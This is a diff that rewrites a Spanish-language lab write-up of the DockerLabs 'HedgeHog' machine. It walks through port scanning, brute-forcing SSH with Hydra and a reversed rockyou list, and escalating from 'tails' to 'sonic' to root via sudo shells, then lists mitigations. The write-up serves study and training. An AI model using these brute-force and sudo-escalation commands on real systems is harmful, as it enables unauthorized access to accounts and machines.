@@ -1,93 +1,248 @@
-# Máquina HedgeHog #
+---
+title: HedgeHog
+description: Resolución de la máquina HedgeHog de DockerLabs
+---
 
-Hoy resolveré la máquina HedgeHog de la plataforma DockerLabs.
+# HedgeHog
 
-Temas a tratar:
+`DockerLabs` `Very Easy` `Linux` `Completada`
 
-- Reconocimiento
-- Fuerza bruta
-- Escalada de privilegios
+Máquina enfocada en enumeración web, interpretación de pistas, fuerza bruta contra SSH y escalada de privilegios mediante permisos inseguros de sudo entre usuarios.
 
-## Paso 1 ##
+## Información de la máquina
 
-Activamos la máquina HedgeHog desde la terminal.
+| Campo | Valor |
+|---|---|
+| Plataforma | DockerLabs |
+| Dificultad | Very Easy |
+| Sistema operativo | Linux |
+| Estado | Completada |
+| Puertos principales | 22 y 80 |
+| Acceso inicial | SSH como tails |
+| Escalada intermedia | Usuario sonic |
+| Acceso final | Root |
 
-![Alt Imagen1](https://blogger.googleusercontent.com/img/a/AVvXsEgXgHBkjdqweVYgmuJ0noHELBKnIUYQqBEO6Mr5MkNx2GE_LG0RVdKv2IvSNTqUKrQEfeeG7xHnB9GwLxVqxabeiq3xaHzxsLWZWMOsV1mp0-eL7aQEgeBly9WzQIFpqMU3EL9JvQ-Rr7ghxdFD5zJGh4hStRUguDWuReAFtqZSV8i2gvLbIgaPEO35JfiS=w381-h302)
+## Técnicas utilizadas
 
-## Paso 2 ##
+`Nmap` `HTTP` `SSH` `Hydra` `Gobuster` `tac` `sed` `Sudo`
 
-Realizamos un escaneo utlizando la herramienta **Nmap**
+## 1. Preparación de la máquina
 
-![Alt Imagen2](https://blogger.googleusercontent.com/img/a/AVvXsEgO_mhWNxdVsJ3wKmlicOrOXzts1IL5F5rO8wVGGiMRcgFd9WvCqXses49ay-NP4EKWidQ7_qWJwjuNqczoswIZqgMI-helPPb_H28KHlTb_IJYWGrr-hL_JLL5i-NfPWV-Q3ewwJ1OK4gLqXgcJ6l3nfFeii-DniZ5GKChBga_EW_XkBaioG4DADB8ACZo=w452-h331)
+Se desplegó la máquina HedgeHog desde DockerLabs.
 
-- '-p- --open' = Escanea todos los puertos con el estado abierto
-- '-sS'= Es un escaneo SYN que evita que el Three-way handshake se complete
-- '--min-rate' = Envia paquetes no mas lentos que la cantidad que elijas
-- '-n' = Desactiva la resolicion DNS
-- '-Pn' = Toma todos los host como activos para evitar hacer ping a cada uno
-- '-vvv' = Muestra el proceso en pantalla mientras se va escaneando
-- 'oG' = Exporta tu escaneo en un formato grepeable para poder examinarlo mas adelante si se necesita
+<!-- IMAGEN PENDIENTE: despliegue de HedgeHog -->
 
-## Paso 3 ##
+## 2. Reconocimiento de puertos
 
-Interpretamos la información obtenida.
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP_OBJETIVO> -oG allPorts
+```
 
-Tenemos un solo puerto abierto:
+El escaneo mostró:
 
-- Puerto 22: En este puerto corre el servicio ssh
-- Puerto 80: En este puerto corre el servicio http
+| Puerto | Servicio | Estado |
+|---:|---|---|
+| 22/TCP | SSH | Abierto |
+| 80/TCP | HTTP | Abierto |
 
-## Paso 4 ##
+<!-- IMAGEN PENDIENTE: escaneo inicial -->
 
-Luego de identificar el puertos abierto que corre, debemos examinar mas a detalle como la versión y que servicio esta corriendo exactamente.
+## 3. Enumeración de servicios
 
-![Alt Imagen2](https://blogger.googleusercontent.com/img/a/AVvXsEgbracBK1ufeYvj0cSZ4A-VRspoTmjVOBJtjUNjipEPW4x9FFy34IV2HYZHCSePjdgBTy5ud97lZs-8fO1lY9x0HdLPnYqONk1oya6H5klI5KDEPh8m6RlCmjzfQu_SDLCA-miPO4c355YRHwbkaj-3iKovWpV6cNsSFZyFnR8wAzAVC8roLZAkur_PoaTM=w456-h265)
+```bash
+sudo nmap -p 22,80 -sCV <IP_OBJETIVO> -oN targeted
+```
 
-- 'p-22,80' = Examina exactamente ese puerto.
-- '-sCV' = Lanza scripts basicos de reconocimiento y detecta la version de este.
+Se identificaron:
 
-## Paso 5 ##
+- OpenSSH 9.6p1 en el puerto 22.
+- Apache 2.4.58 en el puerto 80.
 
-Tenemos el servicio SSH con la version 9.6p1 y un servicio de apache corriendo en el puerto 80 con la version 2.4.58.
+<!-- IMAGEN PENDIENTE: versiones detectadas -->
 
-En el caso de SSH no podemos vulnerar mediante un exploit ya conocido, por lo cual optamos en ver la pagina que esta corriendo en el puerto 80.
+## 4. Enumeración web
 
-![Alt Imagen3](https://blogger.googleusercontent.com/img/a/AVvXsEhRbrOfJnMiJtfKykyXC4KDzKykQ7OffHLLnV6f4tWXxPxUbJW-lFAB6upFnNY-05KMHncw5VuKciFJuyUmDF7jVhBGIrEFEVWkBcHD8VLkHv_4qyDgqil6NcUHQtB3zQBcDCiPDFPHHgR93wDbFrOyiTXih-NhZnMsQlEDRgMR8FYHLvsq-wn1y_9jH1kn=w505-h189)
+Al abrir el servicio HTTP solo apareció la palabra:
 
-Como vemos en la pagina solo hay una palabra llamada tails, no tenemos ninguna otra información, por mi parte intente hacer un escaneo de directorios mediante gobuster, pero tampoco encontre nada.
+```text
+tails
+```
 
-![Alt Imagen4](https://blogger.googleusercontent.com/img/a/AVvXsEhc6C7g-ydN9OBU1jxBvJtVthBHXnp8nEFtUrwippX8X2g4GrVi_oInXxbiCmjY1ZAjUUdEgSchijqpDFpcGs8a60I8_aaEpRnGIXDljW5Qe9XfZwebyP4NrPbKZGXNyir6bIxTHtQH0lUUOtfo_tNdEaYWgc0WS5Uj7--3fgmmqFc2J15ZRjH3YzXEom1a=w470-h272)
+También se intentó enumerar directorios:
 
-Por lo cual podemos hacer un ataque de fuerza bruta probando la palabra tails como usuario de SSH.
+```bash
+gobuster dir \
+    -u http://<IP_OBJETIVO>/ \
+    -w /usr/share/wordlists/dirb/common.txt
+```
 
-## Paso 6 ##
+La enumeración no mostró rutas útiles adicionales.
 
-Utilizando hydra y la wordlist de rockyou, pero el probiema es que al usar un wordlist tan grande el programa de hydra nos dice que demorara demasiadas hora, por lo cual si tomamos como indicio el nombre tails, refiriendose a la cola en español, podemos invertir la wordlist empezando por el final.
+La palabra `tails` se interpretó como una posible pista y como un posible nombre de usuario SSH.
 
-![Alt Imagen5](https://blogger.googleusercontent.com/img/a/AVvXsEj7NSh1jwR7deYkdadZ3wIBK6Toxf_g4eCqBTiSNtiPdfSsRApchtJe8MKEscP6xEFYwdReRA96dxLiuplN3uxvjVihaEKRlLl2IPBlpqNZSm3ja9EFM_W8YU0J9NoCcwoQbM9loIkygNBeZcrNv5538IJTK41lMcXsI2L71Wl7Z-KZ9LH-AQzG_g1El8E4=w630-h63)
+<!-- IMAGEN PENDIENTE: página web con la palabra tails -->
 
-- 'tac' = Es un cat pero al reves, es decir invierte el output.
-- 'sed = Recorre linea por linea, modificando lo que se le indica.
-- 's/^[[:space:]]*//' = Elimina todos los espacios en blanco que hay linea por linea ya que en las contraseñas no se utiliza los espacios en blancos
+## 5. Preparación del diccionario
 
-![Alt Imagen6](https://blogger.googleusercontent.com/img/a/AVvXsEhobe4xOjxZlsOXOvOo7-8OAS_oXSubzm2s-zo7uzXttsuPF5D1aaR6HZ2bqCK1EzW2fcIUX5-JP1TQYEWChA2Qx6lI3um9btXkDATh61D2wYlVRMMmRy8SAUil8iUq92vap7MUyQ13LwIY3Oqcyl4Cw5J8SOhBwK7BWUbrqF0rZbZi-O3gb0DDqgjvtFFF=w456-h154)
+La lista `rockyou.txt` era demasiado extensa. La pista `tails`, que puede relacionarse con “cola” o “final”, llevó a probar el diccionario comenzando desde sus últimas líneas.
 
-Despues de ejecutar hydra con el nuevo wordlist al reves de rockyou podemos encontrar la contraseña, la cual usaremos para obtener acceso mediante SSH.
+Se invirtió la lista con:
 
-## Paso 7 ##
+```bash
+tac /usr/share/wordlists/rockyou.txt > rockyou-reversed.txt
+```
 
-Ingresamos mediante SSH y vemos que somos el usuario tails, tendremos que buscar vulnerabilidades para la escalada de privilegio.
+Para eliminar espacios iniciales se utilizó:
 
-![Alt Imagen7](https://blogger.googleusercontent.com/img/a/AVvXsEhhuHMRKrg3wt2mkcq4Evg1RblWVPlxcvD_BegrU0PZTxn27gK8ZFt3e1DsumHKMll6hE5L7c8qQ_lueb8y_mO4bi6nG7ryWnYfVCtnMONNaJNpWnra-3CoEn8GchPXUI2zU_Ot2Dr2xB8MdONuH0J9i3yKmZkuiHgAa_wfVnA3qYNKb31ap6mm8nMMLKgP=w408-h108)
+```bash
+sed -i 's/^[[:space:]]*//' rockyou-reversed.txt
+```
 
-Observamos que podemos ejecutar comandos con el usuario sonic sin necesidad de contraseña, lo cual optaremos en abrir la bash con el usuario sonic, para seguir buscando vulnerabilidades.
+| Comando | Función |
+|---|---|
+| `tac` | Muestra un archivo en orden inverso |
+| `sed -i` | Modifica el archivo directamente |
+| `s/^[[:space:]]*//` | Elimina espacios al principio de cada línea |
 
-![Alt Imagen8](https://blogger.googleusercontent.com/img/a/AVvXsEhixicgAXS-0GTLY8BhzRx4nsbB5DsxkhXm9HUuX2S3SAodgDYDbKrcKwgLJUesgkOYpozHwx9qIcY5_RW3_MTprM5vl3ULlau0TBHL6UQhECsdPvAsIlwBstl-mrv29bdSG9qonNNGNYN-4xEPdNoveNc_PTTadQN2qz2uS3oDbbccxlTeFQC15LgxpTz5=w425-h123)
+<!-- IMAGEN PENDIENTE: creación del diccionario invertido -->
 
-Como vemos el usuario sonic, puede ejecutar comandos como root, es decir sonic es igual a root, lo cual de igual manera escalamos privilegio.
+## 6. Fuerza bruta contra SSH
 
-![Alt Imagen9](https://blogger.googleusercontent.com/img/a/AVvXsEgQkQP44vgk6UdVfz1_NYObz3Q3OSTWl9suoN9VxkiEqx57Kx6jZTglt67YcTopYWtPR-JWIDE6a3AALZx301U_Ct5sNUHFxLiSDJy0bq3GX_fVU5LV2iR3PIyrt4qEUw08vGPyNCdMxCfNDfTiHLOlDIk7d-jcWeUCiadSFiK66MDm-Bw8Wgsag21rLlGk=w423-h74)
+Se ejecutó Hydra utilizando `tails` como usuario:
 
-Y asi, finalmente ya somos usuarios root, con los privilegios totales.
+```bash
+hydra \
+    -l tails \
+    -P rockyou-reversed.txt \
+    ssh://<IP_OBJETIVO>
+```
 
-Gracias por leer este WriteUp. :)
+Hydra encontró una contraseña válida para el usuario `tails`.
+
+<!-- IMAGEN PENDIENTE: resultado de Hydra -->
+
+## 7. Acceso inicial
+
+Se inició sesión mediante SSH:
+
+```bash
+ssh tails@<IP_OBJETIVO>
+```
+
+Después se comprobó la identidad:
+
+```bash
+whoami
+id
+```
+
+Resultado esperado:
+
+```text
+tails
+```
+
+## 8. Primera escalada: tails a sonic
+
+Se revisaron los permisos de sudo:
+
+```bash
+sudo -l
+```
+
+La configuración permitía ejecutar comandos como el usuario `sonic` sin introducir contraseña.
+
+Se abrió una shell como `sonic`:
+
+```bash
+sudo -u sonic /bin/bash
+```
+
+Se comprobó el cambio:
+
+```bash
+whoami
+```
+
+Resultado:
+
+```text
+sonic
+```
+
+<!-- IMAGEN PENDIENTE: acceso como sonic -->
+
+## 9. Segunda escalada: sonic a root
+
+Desde la cuenta `sonic` se revisaron nuevamente los permisos:
+
+```bash
+sudo -l
+```
+
+La configuración permitía ejecutar comandos como `root`.
+
+Se abrió una shell privilegiada:
+
+```bash
+sudo /bin/bash
+```
+
+La identidad final se comprobó con:
+
+```bash
+whoami
+```
+
+Resultado:
+
+```text
+root
+```
+
+<!-- IMAGEN PENDIENTE: acceso final como root -->
+
+## 10. Vulnerabilidades encontradas
+
+### Contraseña débil en SSH
+
+La contraseña del usuario `tails` podía encontrarse mediante un ataque de diccionario.
+
+### Divulgación de un nombre de usuario
+
+La página web exponía directamente la palabra `tails`, que correspondía con una cuenta válida.
+
+### Permisos sudo inseguros
+
+Los usuarios podían cambiar a otras cuentas con mayores privilegios sin autenticación adicional.
+
+### Escalada encadenada
+
+La combinación de permisos permitió avanzar de `tails` a `sonic` y posteriormente a `root`.
+
+## 11. Medidas de mitigación
+
+- No publicar nombres de usuarios del sistema en páginas web.
+- Usar contraseñas largas, únicas y aleatorias.
+- Priorizar claves SSH en lugar de contraseñas.
+- Implementar Fail2Ban o límites de intentos.
+- Aplicar el principio de mínimo privilegio.
+- Revisar periódicamente `/etc/sudoers`.
+- Evitar permisos `NOPASSWD` innecesarios.
+- No permitir shells completas mediante sudo.
+- Supervisar cambios de usuario y ejecuciones privilegiadas.
+
+## 12. Conclusión
+
+La resolución combinó:
+
+1. Escaneo de puertos.
+2. Enumeración de SSH y HTTP.
+3. Interpretación de una pista web.
+4. Preparación de un diccionario invertido.
+5. Fuerza bruta contra SSH.
+6. Acceso como `tails`.
+7. Cambio al usuario `sonic`.
+8. Escalada final hasta `root`.
+
+La debilidad principal fue la combinación de credenciales débiles y una cadena de permisos sudo excesivos.
